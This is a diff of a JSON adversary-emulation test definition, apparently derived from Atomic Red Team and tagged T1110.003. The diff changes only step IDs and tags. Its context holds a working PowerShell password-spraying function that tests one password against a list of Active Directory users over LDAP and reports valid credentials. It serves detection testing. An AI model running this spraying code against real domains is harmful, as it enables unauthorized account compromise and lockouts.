@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "84c42620-31ee-4efe-aee6-e73bd123eb15",
+      "id": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5",
       "type": "execute-command",
       "data": {
         "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "7e16c83e-b408-4cb8-b0f8-4e15681adf5b",
+      "id": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
       "name": "Check dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "39fef536-fa72-4e2c-b7e8-60035a6ee66e",
+      "id": "407131ba-10de-4257-a232-2e7e3e4d2864",
       "name": "Resolve dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "fa60bc11-ebe7-4608-82a0-a990f6ec67d0",
+      "id": "308920de-fac4-4ad9-8169-d14637e6ec1f",
       "name": "Re-check dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
@@ -51,29 +51,29 @@
   ],
   "flows": [
     {
-      "s": "7e16c83e-b408-4cb8-b0f8-4e15681adf5b",
+      "s": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
       "p": "on-success",
-      "o": "84c42620-31ee-4efe-aee6-e73bd123eb15"
+      "o": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5"
     },
     {
-      "s": "7e16c83e-b408-4cb8-b0f8-4e15681adf5b",
+      "s": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
       "p": "on-failure",
-      "o": "39fef536-fa72-4e2c-b7e8-60035a6ee66e"
+      "o": "407131ba-10de-4257-a232-2e7e3e4d2864"
     },
     {
-      "s": "39fef536-fa72-4e2c-b7e8-60035a6ee66e",
+      "s": "407131ba-10de-4257-a232-2e7e3e4d2864",
       "p": "on-success",
-      "o": "fa60bc11-ebe7-4608-82a0-a990f6ec67d0"
+      "o": "308920de-fac4-4ad9-8169-d14637e6ec1f"
     },
     {
-      "s": "fa60bc11-ebe7-4608-82a0-a990f6ec67d0",
+      "s": "308920de-fac4-4ad9-8169-d14637e6ec1f",
       "p": "on-failure",
-      "o": "84c42620-31ee-4efe-aee6-e73bd123eb15"
+      "o": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5"
     }
   ],
   "tags": [
-    "T1110.003",
-    "atomic-red-team"
+    "T1110",
+    "T1110.003"
   ],
   "input_arguments": [
     {
